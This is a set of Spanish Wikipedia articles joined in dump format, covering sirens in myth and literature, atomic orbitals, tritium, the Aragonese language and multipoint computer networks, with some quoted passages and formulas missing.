En la actualidad hay opiniones acerca de la existencia de estas criaturas mitológicas. Esta diversidad la encontramos en documentales y artículos que aseguran e incluso argumentan su existencia. Un ejemplo es una fantasía en forma de documental televisado en la cadena Animal Planet de Discovery Channel, y muchas personas pensaron que eran pruebas de existencia.

En el siglo IV, cuando las creencias paganas fueron eclipsadas por el cristianismo, la fe en los seres mitológicos fue erradicada junto con las sirenas. Jerónimo, que produjo la versión Vulgata de la Biblia utiliza la palabra "sirenas" al traducir םינת Thanim (chacal) en Isaías 13:22 y (búhos) en Jeremías 50:39, esto fue explicado por Ambrosio como un símbolo de las tentaciones del mundo, y no como un aval de la mitología griega.

La interpretación evemerista paleocristiana de los seres humanos recibió un impulso de larga duración en la obra Etimologías de Isidoro. "Ellos [los griegos] imaginaban que 'había tres sirenas, parte virgen, parte ave con alas y garras. 'Una de ellas cantaba, otra tocaba la flauta y la tercera la lira.

Las sirenas se siguió utilizando como un símbolo de la peligrosa tentación encarnada por las mujeres, con regularidad durante todo el arte cristiano de la época medieval; Sin embargo, en el siglo XVII, algunos escritores jesuitas comenzaron a afirmar su existencia real, incluyendo Cornelius, que dijo de la mujer, "su mirada es como la del legendario basilisco, su voz como de sirena, que encanta y con su belleza se priva de la razón". Antonio de Lorea y Atanasio Kircher argumentaron que las sirenas habrían aparecido a bordo del arca de Noé. Otros indican que las sirenas fueron pecadoras que de alguna forma lograrón sobrevivir al diluvio, pero afirman que Dios no crea seres parte humano y parte animal. 

La Biblia no menciona sirenas, pero sí algunos híbridos que proceden directamente de la mitología griega como Sátiro: el libro de Yashar indica que previo al diluvio, los ángeles caídos estaban mezclando especies de un animal con otra, llamados Nefilim.

La tipología de la representación gráfica de las sirenas es variada. Las sirenas de la mitología clásica suelen aparecer en ánforas, cráteras, vasos y espejos, y por regla general son de tratamiento naturalista: hermoso rostro y largos cabellos, que en muchas ocasiones vuelan o esperan sobre las rocas sosteniendo instrumentos musicales o acariciando sus cabellos en actitud coqueta.
En el siglo XVI, la actitud más generalizada de las sirenas fue sostener con las manos un espejo y un peine. La cola era un emblema de la prostitución y el espejo, considerado como objeto mágico, era atributo de la mujer impura, y servía para contemplar el rostro de la muerte o el culto al diablo (similitud a la actitud de Afrodita en el mundo clásico). La sirena también implica un símbolo de los tiempos de transición de Carnestolendas (carnes terrestres) a la Cuaresma (pescado).
Más adelante las sirenas aparecen amamantando a sus crías. La leche de las sirenas era conocida por los alquimistas como una proteína que permitía el crecimiento rápido de los héroes abandonados en el agua. Por otra parte, la tipología que gozó de mayor predicamento en las representaciones góticas, fue la sirena de cola pisciforme única.

En la leyenda de Jasón y los Argonautas, los marineros encantados por la voz de las sirenas se salvaron del desastre gracias a la habilidad de Orfeo, que logró con su canto tapar la música de aquellas y distraer a los Argonautas que se hubieran encallado de otro modo en los "sirenum scopuli" donde estas habitaban. Derrotadas por la superior habilidad de Orfeo, las sirenas se transformaron en piedra, o en otras versiones se arrojaron al mar para morir.

En la "Odisea" (XII, 39), Ulises preparó a su tripulación para evitar la música de las sirenas tapándoles los oídos con cera; deseoso de escucharlas él mismo, se hizo atar a un mástil para no poder arrojarse a las aguas al oír su música.

En las Las mil y una noches las sirenas se conciben como anatómicamente idénticas a los seres humanos con una única distinción, su capacidad de respirar y vivir bajo el agua. En este cuento los humanos y las sirenas pueden reproducirse. Como resultado los hijos de estas uniones tienen la capacidad de vivir bajo el agua. En el cuento "Abdullah Abdullah de los Pescadores y el Merman", el protagonista del Pescador Abdullah gana la habilidad de respirar bajo el agua y descubre una sociedad bajo el agua que se presenta como un reflejo invertido de la sociedad sobre la tierra. En "Las aventuras de Bulukiya", la búsqueda del protagonista Bulukiya para la hierba de la mortalidad, le lleva a explorar los mares, donde se encuentra con el reino de las sirenas. En el titulado "La ciudad de bronce" leemos la siguiente descripción:

Cristóbal Colón afirma en su Diario de su Primer Viaje (1492-3), que vio a las sirenas en el Nuevo Mundo, que él creía la parte más oriental de Asia. Según la transcripción de Bartolomé de las Casas:

Muy distinta es la sirena del relato clásico de Hans Christian Andersen "La sirenita", capaz de entender y hablar la lengua de los hombres, un personaje tierno y enamoradizo que salva a un apuesto príncipe de naufragar. La joven sirenita se enamora del príncipe y ansía ser humana para obtener un alma inmortal, algo que solo los humanos poseían, según Andersen. La sirenita hace un pacto con la bruja del mar: La bruja del mar la transformará en una chica humana, pero sus pies dolerán como cien cuchillos clavándose en ellos a cada paso que dé, y si el príncipe se casa con otra chica que no sea la sirenita, la sirenita morirá convirtiéndose en espuma de mar al día siguiente de la boda. Como pago, la bruja del mar le corta la lengua a la sirenita y así se queda con su bella voz. 
El príncipe, tras un brevísimo idilio con la sirenita, se acaba casando con otra princesa, a la que cree su salvadora del naufragio. Las hermanas de la sirenita ofrecen sus cabellos a la bruja del mar a cambio de un cuchillo mágico que le devolverá a la sirenita su cola de pez, si mata con él al príncipe y baña sus piernas con su sangre. Pero el amor de la sirenita es tan grande que prefiere transformarse en espuma antes que matar a su amado. Por su bondad, será recompensada convirtiéndose en una hija del aire, dándole así a la sirenita la oportunidad de conseguir un alma inmortal.

También se puede recordar a JK Rowling, quien en el cuarto libro de la saga Harry Potter, el Cáliz de Fuego, inserta a las sirenas en el lago negro, lugar donde Harry deberá pasar su segunda prueba. Dice que su canto solo es entendible debajo del agua, y que muy pocos magos pueden comprenderlas fuera de la misma. No las describe como criaturas bellas.

En El mar de los monstruos, mientras Percy y Annabeth navegan apresuradamente en el Venganza de la Reina Ana a través del mar de los monstruos, pasan cerca de la isla de las sirenas. Percy se tapa los oídos para no escuchar sus cantos pero Annabeth lo convence de que la amarre al mástil y así ella pueda escucharlos, pues transmitían poderosos mensajes. Sin embargo, Annabeth logra desatarse y se arroja al mar a nadar hacia las sirenas, siendo rescatada por Percy.

En "Los secretos de Old Cap - McLelland", de Andrés Gómez Ordóñez, se explora a la sirena clásica, calificándola como "merrow" por sus protagonistas. En la historia, se toman elementos como la prenda mágica con la que se esclaviza a la sirena, las lágrimas que se convierten en perlas, el canto sublime, e incluso se menciona que las víctimas mueren convertidas en espuma. En este caso, la sirena es malvada, y busca escapar de un antiguo hechizo, poniendo a la ficticia población de Old Cap en aprietos. En este caso, el canto de la sirena produce efectos muy curiosos en los hombres que la escuchan.

Aunque en la iconografía moderna las sirenas se representan por lo general como de abrumadora belleza, es probable que en la tradición clásica su único atractivo radicase en su voz y que su apariencia fuese poco menos que monstruosa. Horacio, en la "Epístola ad Pisones", hace mención a un híbrido de mujer y pez como un sujeto hilarante:

Se ha comentado que posiblemente las sirenas que tanto intrigaron a Sigmund Freud son la intelectualización tardía de un hecho narrativo que aúna peligro y belleza. En todo caso, ése sería un añadido elaborado a lo largo de los siglos a su origen como horrendas y extraordinarias cantantes que ocultaban el asesinato y la antropofagia.


















</doc>
<doc id="6331" url="https://es.wikipedia.org/wiki?curid=6331" title="Cortafuegos">
Cortafuegos

La palabra cortafuego o cortafuegos puede referirse a:





</doc>
<doc id="6332" url="https://es.wikipedia.org/wiki?curid=6332" title="Orbital atómico">
Orbital atómico

Un orbital atómico es la región del espacio definido por una determinada solución particular, espacial e independiente del tiempo, a la ecuación de Schrödinger para el caso de un electrón sometido a un potencial coulombiano. La elección de tres números cuánticos en la solución general señalan unívocamente a un estado monoelectrónico posible.

Estos tres números cuánticos hacen referencia a la energía total del electrón, el momento angular orbital y la proyección del mismo sobre el eje z del sistema del laboratorio y se denotan por

Un orbital también puede representar la posición independiente del tiempo de un electrón en una molécula, en cuyo caso se denomina orbital molecular.

La combinación de todos los orbitales atómicos dan lugar a la corteza electrónica, representada por el modelo de capas, el cual se ajusta a cada elemento químico según la configuración electrónica correspondiente.

El orbital es la descripción ondulatoria del tamaño, forma y orientación de una región del espacio disponible para un electrón. Cada orbital con diferentes valores de "n" presenta una energía específica para el estado del electrón.

La posición (la probabilidad de la amplitud) de encontrar un electrón en un punto determinado del espacio se define mediante sus coordenadas en el espacio. En coordenadas cartesianas dicha probabilidad se denota como formula_1, donde formula_2 no se puede medir directamente.

Al suponer en los átomos simetría esférica, se suele trabajar con la función de onda en términos de coordenadas esféricas, formula_3.

En el modelo atómico surgido tras la aplicación de la mecánica cuántica a la descripción de los electrones en los átomos (modelo posterior al modelo atómico de Bohr), se denomina orbital atómico a cada una de las funciones de onda monoelectrónicas que describen los estados estacionarios y espaciales de los átomos hidrogenoides. Es decir, son los estados físicos estacionarios en representación de posición, formula_4, que se obtienen resolviendo la ecuación de Schrödinger independiente del tiempo formula_5, es decir, las funciones propias del operador hamiltoniano, formula_6).

No representan la posición concreta de un electrón en el espacio, que no puede conocerse dada su naturaleza mecanocuántica, sino que representan una región del espacio en torno al núcleo atómico en la que la probabilidad de encontrar al electrón es elevada (por lo que en ocasiones al orbital se le llama "región espacio-energética de manifestación probabilística electrónica" o REEMPE).

En el caso del átomo de hidrógeno, se puede resolver la ecuación de Schrödinger de forma exacta, encontrando que las funciones de onda están determinadas por los valores de tres números cuánticos "n", "l", "m", es decir, dicha ecuación impone una serie de restricciones en el conjunto de soluciones que se identifican con una serie de números cuánticos. Estas condiciones surgen a través de las relaciones existentes entre estos números; no todos los valores son posibles físicamente.

La notación (procedente de la espectroscopia) es la siguiente:

El nombre que se asigna a las distintas clases de orbitales se debe a su relación con las líneas del espectro de un elemento (en inglés s "sharp", p "principal", d "diffuse" y f "fundamental" y el resto de los nombres, a partir de aquí, siguen el orden alfabético g, h ).

Posteriormente se tuvo la necesidad de incluir "ad hoc" el espín del electrón, el cual viene descrito por otros dos números cuánticos "s" y "m". En la mecánica cuántica relativista el espín surge de forma espontánea y no hace falta introducirlo "a mano".

La función de onda se puede descomponer, empleando como sistema de coordenadas las coordenadas esféricas, de la siguiente forma:

donde formula_7 representa la parte del orbital que depende de la distancia del electrón al núcleo y formula_8 es la parte que depende de los ángulos (geometría sobre una esfera unidad) del orbital y son los armónicos esféricos:

Para la representación gráfica del orbital se emplea la función cuadrado, formula_9 y formula_10, ya que ésta es proporcional a la densidad de carga y por tanto a la densidad de probabilidad, es decir, el volumen que encierra la mayor parte de la probabilidad de encontrar al electrón o, si se prefiere, el volumen o región del espacio en la que el electrón pasa la mayor parte del tiempo.

En sentido estricto, los orbitales son construcciones matemáticas que tratan de describir, de forma coherente con la mecánica cuántica, los estados estacionarios de un electrón en un campo eléctrico de simetría central. (Dado que el núcleo no está descrito de forma explícita, ni siquiera describen de forma completa al átomo de hidrógeno).

Estas construcciones matemáticas no están preparadas, por su origen monoelectrónico, para tener en cuenta ni la correlación entre electrones ni la antisimetría exigida por la estadística de Fermi (los electrones son fermiones).

Sin embargo, saliéndose de su sentido estricto, han demostrado ser de enorme utilidad para los químicos, de forma que se utilizan no solo para sistemas polielectrónicos, sino también para sistemas polinucleares (como las moléculas). También, más allá de su sentido estricto, los químicos se refieren a ellos como entes físicos más que como construcciones matemáticas, con expresiones como «en un orbital caben dos electrones».

Por simplicidad, se recogen las formas de la "parte angular" de los orbitales, obviando los nodos radiales, que siempre tienen forma esférica.

El orbital s tiene simetría esférica alrededor del núcleo atómico. En la figura siguiente se muestran dos formas alternativas para representar la nube electrónica de un orbital s: en la primera, la probabilidad de encontrar al electrón (representada por la densidad de puntos) disminuye a medida que nos alejamos del centro; en la segunda, se representa el volumen esférico en que el electrón pasa la mayor parte del tiempo y por último se observa el electrón.

La forma geométrica de los orbitales p es la de dos esferas achatadas hacia el punto de contacto (el núcleo atómico) y orientadas según los ejes de coordenadas. En función de los valores que puede tomar el tercer número cuántico m (-1, 0 y 1) se obtienen los tres orbitales p simétricos respecto a los ejes "x", "z" e "y". Análogamente al caso anterior, los orbitales p presentan n-2 nodos radiales en la densidad electrónica, de modo que al incrementarse el valor del número cuántico principal la probabilidad de encontrar el electrón se aleja del núcleo atómico.
El orbital "p" representa también la energía que posee un electrón y se incrementa a medida que se aleja entre la distancia del núcleo y el orbital. 

Los orbitales d tienen formas más diversas. Cuatro de ellos tienen forma de 4 lóbulos de signos alternados (dos planos nodales, en diferentes orientaciones del espacio), y el último es un doble lóbulo rodeado por un anillo (un doble cono nodal). Siguiendo la misma tendencia, presentan n-3 nodos radiales. Este tiene 5 orbitales y corresponde al número cuántico l (azimutal)

Los orbitales f tienen formas aún más exóticas, que se pueden derivar de añadir un plano nodal a las formas de los orbitales d. Presentan n-4 nodos radiales.

La tabla siguiente muestra todas las configuraciones orbitales para el hidrógeno, como funciones de onda, desde el 1"s" al 7"s". Los átomos polielectrónicos irían alojando sus electrones en dichos grupos de orbitales.



</doc>
<doc id="6341" url="https://es.wikipedia.org/wiki?curid=6341" title="Tritio">
Tritio

El tritio es un isótopo natural del hidrógeno; es radiactivo. Su símbolo es ³H. Su núcleo consta de un protón y dos neutrones. Tiene un periodo de semidesintegración de 12,3 años.
El tritio se produce por bombardeo con neutrones libres de blancos de litio, boro o nitrógeno. Su producto de desintegración es ³He<sup>+1

Al tener su núcleo tres nucleones que participan en la interacción fuerte, y sólo un protón cargado eléctricamente, con el tritio se puede realizar la fusión nuclear más fácilmente que con el isótopo más común del hidrógeno (hidrógeno-1).

El tritio (hidrógeno-3) es producido naturalmente por la acción de los rayos cósmicos sobre los gases atmosféricos. También puede ser obtenido artificialmente en el laboratorio.

A medida que el núcleo del tritio se transmuta, emite un electrón, causando una liberación de energía en forma de radiación beta. Se forma entonces un nuevo núcleo con dos protones y un neutrón, de forma tal que se convierte en una forma no radiactiva de helio (helio-3).

El tritio produce emisiones beta de baja energía y no emite ningún otro tipo de radiación primaria. De hecho, el tritio emite el nivel más bajo de energía por radiación beta de todos los isótopos (en la práctica implica que sus partículas beta son fácilmente detenidas por finas capas de cualquier material sólido).

Se espera que a medio o largo plazo la tecnología logre fusionar de forma controlada tritio y deuterio. Esta fuente de energía, al contrario que la nuclear actual, sería limpia e inagotable, pues el deuterio está presente en el agua de mar y el tritio se produce con litio, que también es muy abundante en la corteza terrestre. El producto de la fusión de ambos elementos es el helio, que no es radiactivo.

El tritio fue producido por primera vez en 1934 a partir del deuterio, otro isótopo del hidrógeno, por Ernest Rutherford, trabajando con Mark Oliphant y Paul Harteck. Rutherford fue incapaz de aislar el tritio, un trabajo que hicieron Luis Walter Alvarez y Robert Cornog, que dedujeron correctamente que la sustancia era radiactiva. Willard Frank Libby descubrió que el tritio se podría utilizar para la datación del agua, y, por lo tanto, del vino.


</doc>
<doc id="6342" url="https://es.wikipedia.org/wiki?curid=6342" title="Idioma aragonés">
Idioma aragonés

El aragonés es una lengua romance de la península ibérica, hablada actualmente por unas 25 500 personas en varias zonas de Aragón, donde tiene estatus de lengua propia. También se le denomina altoaragonés o "fabla" aragonesa. Se habla principalmente en el norte de Aragón, en las comarcas de La Jacetania, Alto Gállego, Sobrarbe y la parte occidental de Ribagorza, aunque se habla también, algo castellanizado, en otras comarcas de la zona. Las variedades más orientales (como las del valle de Benasque) tienen características de transición con el catalán. No existen datos sobre el uso de la lengua entre los hablantes que han emigrado a comarcas no aragonesófonas. Asimismo, existe un número indeterminado de neohablantes que han aprendido el aragonés en un intento por impulsar este idioma amenazado de extinción.

Algunos ejemplos del aragonés ansotano recogidos por Jean-Joseph Saroïhandy, junto con una traducción al castellano son:


La denominación formal más común de la lengua es aragonés, nombre con el que se la conoce local e internacionalmente. Al estadio medieval se le llama navarroaragonés, aunque la filología moderna hace distinción entre los romances medievales navarro y aragonés.

Fabla aragonesa, o simplemente fabla, es otra denominación popularizada en el último cuarto del siglo XX que es empleada en los dialectos occidentales del aragonés (documentada en Hecho, Ansó, Ayerbe, Luesia y Uncastillo).

También es posible encontrar la denominación altoaragonés como sinónimo, pero su uso actual es minoritario.

Durante algún tiempo la lengua fue conocida legalmente en Aragón como Lengua aragonesa propia de las áreas pirenaica y prepirenaica, debido a la aprobación de la ley de lenguas en Aragón de 2013, durante el gobierno del Partido Popular en la comunidad.

Es común la denominación de la lengua mediante los nombres de las diferentes variedades locales.

La clasificación más aceptada establece cuatro grupos, dentro de los cuales se clasifican las diferentes variedades:

Popularmente, la falta de referentes lingüísticos claros y una diglosia multisecular han favorecido la falta de conciencia unitaria entre los hablantes de la lengua aragonesa y, en las zonas donde el dialecto propio se ha conservado mejor, los hablantes suelen utilizar nombres locales. Por ejemplo:


Existen algunos dialectos del aragonés en los valles del Pirineo axial, una variedad con rasgos más general en el Somontano (más castellanizada) y formas de transición entre ambas.

Las hablas más orientales del dialecto ribagorzano, junto con las más occidentales del catalán ribagorzano, pueden considerarse una variante romance de transición, compartiendo características con el catalán y con el aragonés.

El aragonés comparte numerosas isoglosas con otras lenguas iberorromances y algunas con las lenguas occitano-romances, ocupando una posición intermedia en algunos aspectos entre ambos grupos.

Por su contexto geográfico e histórico, se clasifica como idioma románico occidental, aunque alguna de las características tradicionales que definen las lenguas romances occidentales, como la sonorización de las oclusivas sordas intervocálicas, no se cumplen en este idioma:

Ethnologue clasifica el aragonés junto al mozárabe, postulando un hipotético grupo pirenaico-mozárabe, clasificación discutible ya que el mozárabe tiene evoluciones fonéticas peculiares no compartidas ni por el aragonés ni por ninguna otra lengua romance de la península.

Aunque muchos lingüistas clasifican al aragonés en el grupo de lenguas iberorromances, el aragonés presenta unas divergencias que lo separan de los romances del oeste peninsular (castellano, astur-leonés y gallego-portugués), relacionándolo más con el catalán y el occitano (especialmente el occitano gascón), y con el resto de la Romanía en general. Un ejemplo es el caso de la conservación de las partículas pronominalo-adverbiales "ibi/bi/i" y "en/ne". En su léxico elemental, el aragonés también cuenta con un porcentaje ligeramente superior de vocablos más cercanos al catalán (especialmente el catalán occidental) y con el gascón, que no pasa con el castellano, aunque eso depende también de la variedad de aragonés.

Así pues, el aragonés occidental no comparte ya tanto léxico con los vecinos orientales como lo hace el oriental y el ribagorzano. Los antiguos navarro y riojano eran variedades navarroaragonesas más cercanas al castellano o que aparentemente se castellanizaron posteriormente.

Como consecuencia, el aragonés moderno es un idioma romance posicionado entre el conjunto iberorromance y el conjunto formado por el catalán y el occitano, haciendo de puente entre el castellano y el catalán, pero también en muchos casos entre el castellano y el gascón. El hecho de compartir con el gascón y el catalán noroccidental (y en ocasiones con el vasco) una serie de vocablos exclusivos provenientes del latín, pone también al aragonés en un subgrupo llamado en ocasiones "pirenaico". A su vez, su arcaísmo en algunas ocasiones lo acerca al asturiano frente al castellano.

Estas clasificaciones hacen que el aragonés pueda aparecer como el más oriental de las lenguas iberorromances (cuando no se incluyen el catalán o el occitano) o como el más sudoccidental de las occitanorromances, pirenaicas y galorromances.

Los fonemas están entre barras oblicuas / /, los alófonos de un fonema están entre corchetes [ ], la notación ortográfica está en cursiva y sigue la ortografía de la Academia del Aragonés.

<noinclude>

Un acento gráfico "(á, é, í, ó, ú)" indica una posición irregular del acento tónico.

Algunos rasgos históricos del aragonés comparados con los de otras lenguas (abreviaturas usadas: "esp" = español; "cat" = catalán; "occ" = occitano; "port" = portugués; "galport" = galaico-portugués; "ast" = asturiano; "gal" = gallego):











Los posesivos tienen función determinativa cuando van precedidos del artículo definido. El sustantivo determinado puede encontrarse en mitad de la combinación:

En ocasiones no hay artículo:

Con algunos sustantivos referentes a parientes cercanos, se emplea también la forma corta del posesivo, que no va acompañada de artículo:

El aragonés, como muchas de las lenguas romances pero a diferencia de las iberorromances, conserva derivados de las formas latinas INDE e IBI en las partículas pronominoadverbiales: "en/ne" "bi/i/ie" (castellano antiguo y francés "en", "y"; catalán "en", "hi").

La combinación común en aragonés de los pronombres personales de tercera persona de complemento directo e indirecto sólo distingue el número en el indirecto (li/le; lis/les) pero los dos géneros y números se reducen a una sola forma (en/ne) en el directo.

Esta forma es bastante particular si se compara con la de las lenguas vecinas, en las cuales o bien no hay distinción de género y número en el indirecto (en castellano) o bien diferencia de número y género en el complemento directo (en catalán):

Hay que tener en cuenta que existen formas en algunos dialectos aragoneses que sí tienen marcado el género y número del complemento directo. Así sucede en las formas ribagorzanas "lo i", "la i", "los i", "las i"; o en las formas belsetanas "le'l / le lo", "le la", "le's / le los", "le las", comparables con las combinaciones de pronombres "li'l", "li la", etc., propias del valenciano actual y presentes en el catalán antiguo.


Típicamente aragonesas son las preposiciones de movimiento "entro/entra", "enta" y las estáticas "davant", "aprés", "ultra" y "dius", que se utilizaban ya en las obras de Heredia.


Otras preposiciones son más o menos equivalentes en su uso a las castellanas y catalanas, como "de", "a" y "en". Otras tienen un uso ligeramente distinto: "por", "pora/pera/para", "contra", "desde", "sobre", "sin", "segunt", "entre", "con", "desde".

La diferencia con el español, la latina permanece en las terminaciones del pretérito imperfecto de indicativo en las conjugaciones segunda y tercera:

Se han propuesto diversas ortografías para el aragonés, ninguna de las cuales tiene caracter oficial:






La variedad estándar del aragonés se está elaborando todavía, pero hay dos concepciones divergentes.

Tiene su origen en el latín vulgar que se formó en los valles pirenaicos aragoneses durante los siglos VII y VIII en un área presumiblemente de sustrato eusquérico. La lengua recibe, en su período medieval, la denominación de aragonés medieval. Recibe también entre lingüistas la denominación de navarroaragonés, por la inicial dependencia aragonesa del Reino de Navarra y su uso en la zona no vascohablante.

La Reconquista, o expansión del primitivo Reino de Aragón hacia el sur sobre tierras musulmanas, llevaría consigo el idioma por todo el territorio conquistado, siendo los siglos XIII y XIV aquellos en que abarcaría su mayor extensión. La unión del Reino de Aragón con el Condado de Barcelona en lo que sería la Corona de Aragón supuso una importante influencia mutua entre la lengua aragonesa y la lengua catalana. La Cancillería Real tendría el latín, el catalán y el aragonés por lenguas de uso, y ocasionalmente el occitano.

El principal personaje de la lengua aragonesa fue sin duda Juan Fernández de Heredia, fundador del linaje y Gran Maestre de la Orden de San Juan del Hospital de Jerusalén con sede en Rodas. Escribió un amplio catálogo de obras en aragonés y además tradujo diversas obras del griego al aragonés, por vez primera en la Europa medieval.

Con la instauración, en 1412, de la dinastía castellana de los Trastámara en la Corona de Aragón, el castellano se va convirtiendo progresivamente en la lengua de la corte y de la nobleza aragonesa. Las clases altas y los núcleos urbanos serán los primeros focos de castellanización, quedando el aragonés cada vez más relegado a lengua de ámbito rural o doméstico, y a sufrir un desprestigio social progresivo.

Los siglos posteriores al Decreto de Nueva Planta de Felipe V supondrían la implantación casi total de la lengua castellana en Aragón, donde actualmente es el único idioma oficial y la lengua familiar de la mayoría de los aragoneses.

En los años posteriores a la dictadura de Franco, el aragonés contó con una notable revitalización, que llevó a la creación de asociaciones defensoras y promotoras del idioma, a progresivos intentos de estandarización de los dialectos –así como de unas normas ortográficas consensuadas–, a una creciente creatividad artística, principalmente literaria, y a una búsqueda de su cooficialidad en varios municipios altoaragoneses. Sin embargo, y a pesar del aumento de estudiantes de aragonés y de gente concienciada con la salvaguarda del idioma, éste sigue contando con muy poca ayuda por parte de las instituciones, y su estado de conservación es cada vez más precario entre sus hablantes nativos. Hoy las hablas aragonesas mejor conservadas se dan en los valles jacetanos de Hecho y Ansó (llamado Cheso), en el valle de Gistaín, en el valle de Tena — donde mejor se conserva es en Panticosa (conocido como panticuto)—, y las hablas de la Ribagorza occidental, principalmente en Benasque.

Este idioma está considerado por el Atlas Interactivo UNESCO de las Lenguas en Peligro en el Mundo como una lengua en peligro de desaparición.

Se legisló sobre el uso del idioma aragonés a través de la "LEY 10/2009, de 22 de diciembre, de uso, protección y promoción de las lenguas propias de Aragón", más conocida como Ley de Lenguas de Aragón de 2009, donde se decía que la lengua aragonesa era una lengua propia original e histórica de Aragón y se daban unos derechos lingüísticos como poder usarla oralmente y por escrito en las administraciones públicas aragonesas. Tras ella se creó la Academia de la Lengua Aragonesa, el 5 de abril de 2011.

Posteriormente, el 9 de marzo de 2013 esta ley fue derogada al aprobarse Ley de Lenguas de Aragón de 2013, creándose la Academia Aragonesa de la Lengua. Esta nueva Ley de Lenguas hace referencia al aragonés bajo la denominación de "lengua aragonesa propia de las áreas pirenaica y prepirenaica".

La lengua se habla principalmente en los valles del Pirineo aragonés y, con un grado creciente de castellanización, se extiende hacia el sur hasta Huesca. Las áreas en las que se conserva el aragonés clasificadas de mayor a menor vitalidad son: Ribagorza (con diversas variedades dialectales), valle de Hecho, valle de Chistau, valle de Ansó, valle de Bielsa, zona de Ayerbe, valle de Aragüés, Cinca Medio, Somontano de Barbastro, Alto Gállego y valle de Tena, Sobrarbe central, valle de Basa, ribera del Gállego y valle de Rasal, Jacetania, ribera de Fiscal, Somontano de Huesca, valle de Broto y valle de Canfranc.

Las comarcas donde pervive el aragonés son: la Jacetania, el Alto Gállego, el Sobrarbe, la Ribagorza, las Cinco Villas, la Hoya de Huesca, el Somontano de Barbastro, el Cinca Medio y los Monegros.

El Anteproyecto de la Ley de Lenguas de Aragón de 2001reconocía como "municipios que pueden ser declarados zonas de utilización predominante de su respectiva lengua o modalidad lingüística propia o zonas de utilización predominante del aragonés normalizado" a los siguientes municipios: Abiego, Abizanda, Adahuesca, Agüero, Aínsa-Sobrarbe, Aísa, Albero Alto, Albero Bajo, Alberuela de Tubo, Alcalá del Obispo, Alerre, Almudévar de Cinca, Almunia de San Juan, Alquézar, Angüés, Ansó, Antillón, Aragüés del Puerto, Ardisa, Argavieso, Arguis, Ayerbe, Azara, Azlor, Bagüés, Bailo, Banastás, Barbastro, Barbués, Barbuñales, Bárcabo, Benasque, Berbegal, Biel-Fuencalderas, Bierge, Biescas, Bisaurri, Biscarrués, Blecua y Torres, Boltaña, Borau, Broto, Caldearenas, Campo, Canal de Berdún, Canfranc, Capella, Casbas de Huesca, Castejón de Sos, Castejón del Puente, Castiello de Jaca, Castillazuelo, Colungo, Chía, Chimillas, Estada, Estadilla, Fago, Fanlo, Fiscal, Fonz, Foradada de Toscar, El Frago, La Fueva, Gistaín, El Grado, Graus, Hoz de Jaca, Hoz y Costeán, Huerto, Huesca, Ibieca, Igriés, Ilche, Jaca, Jasa, La Sotonera, Labuerda, Longás, Laluenga, Perdiguera, Lascellas-Ponzano, Laspuña, Loarre, Loporzano, Loscorrales, Lupiñén-Ortilla, Mianos, Monflorite-Lascasas, Monzón, Murillo de Gállego, Naval, Novales, Nueno, Olvena, Palo, Panticosa, Peñas de Riglos, Peraltilla, Perarrúa, Pertusa, Piracés, Plan, Pozán de Vero, La Puebla de Castro, Puente la Reina de Jaca, Puértolas, El Pueyo de Araguás, Quicena, Robres, Sabiñánigo, Sahún, Salas Altas, Salas Bajas, Salillas, Sallent de Gállego, San Juan de Plan, Sangarrén, Santa Cilia, Santa Cruz de la Serós, Santa Eulalia de Gállego, Santa Liestra y San Quílez, Santa María de Dulcis, Secastilla, Seira, Senés de Alcubierre, Sesa, Sesué, Siétamo, Tardienta, Tella-Sin, Tierz, Torla-Ordesa, Torralba de Aragón, Torres de Alcanadre, Torres de Barbués, Valle de Bardají, Valle de Hecho, Valle de Lierp, Vicién, Villanova, Villanúa, Yebra de Basa y Yésero.
El aragonés cambió con la influencia del castellano. Hubo cambios en los locativos cuando el castellano se extendió a la región tradicional del aragonés. Estos cambios reflejan las diferencias entre las lenguas con respecto a la ortografía y la pronunciación.

En ciertos casos, el nombre aragonés está en cooperación con la estructura fonética de castellano. En estos casos, el nombre aragonés sobrevive en el castellano, como en el caso de Bielsa, Estada y Fago. En otros casos, la ortografía cambia para reflejar la pronunciación de la palabra, como en el caso de Alastuei o Varbenuta:

En otros casos, hay una sustitución de los diptongos aragoneses /ia/, /ua/ con los diptongos castellanos /ie/, /ue/. También, hay un cambio del /a/ aragonés al /e/ castellano.

Hay cambios gráficos de las consonantes, por ejemplo la consonante aragonesa <x> se sustituye por las castellanas <j> o <g>, por ejemplo en los topónimos Caixigar y Fraixen a Cajigar y Fragén. También hay sustitución del sonido /d/ por /t/ y de /b/ por /p/. Este cambio es ejemplificado en la palabra Pandicosa y Cámbol.

Existe un cambio de los artículos aragoneses, |os, as, lo| a los artículos castellanos, |los, las, el|. También hay una sustitución del morfema de plural |s| del aragonés por el plural |es| del castellano y de la terminación aragonesa –au a la castellano "–ado".

Véase el informe sobre la enseñanza del aragonés, de Martínez y Paricio (2017) (en inglés). 







</doc>
<doc id="6346" url="https://es.wikipedia.org/wiki?curid=6346" title="Red multipunto">
Red multipunto

Las redes multipunto son redes de computadoras en las cuales cada canal de datos se puede usar para comunicarse con diversos nodos. 

En una red multipunto solo existe una línea de comunicación cuyo uso está compartido por todas las terminales en la red. La información fluye de forma bidireccional y es discernible para todas las terminales de la red. 

En este tipo de redes, las terminales compiten por el uso del medio, de forma que el primero que lo encuentra disponible lo acapara, aunque también puede negociar su uso. En términos más sencillos: permite la unión de varios terminales a su computadora compartiendo la única línea de transmisión, su principal ventaja consiste en el abaratamiento de costos, aunque puede perder velocidad y seguridad.


Aquellas redes en las que la transmisión de datos se realiza por un sólo canal de comunicación, compartido entonces por todas las máquinas de la red. Cualquier paquete de datos enviado por cualquier máquina es recibido por todas las de la red.

Son aquellas en las que existen muchas conexiones entre parejas individuales de máquinas. Para poder transmitir los paquetes desde una máquina a otra a veces es necesario que éstos pasen por máquinas intermedias, siendo obligado en tales casos un trazado de rutas mediante dispositivos routers.

Esta estructura se utiliza en aplicaciones de televisión por cable, sobre la cual podrían basarse las futuras estructuras de redes que alcancen los hogares. También se ha utilizado en aplicaciones de redes locales analógicas de banda ancha.

Involucra o se efectúa a través de redes WAN, una red malla contiene múltiples caminos, si un camino falla o está congestionado el tráfico, un paquete puede utilizar un camino diferente hacia el destino. Los routers se utilizan para interconectar las redes separadas.

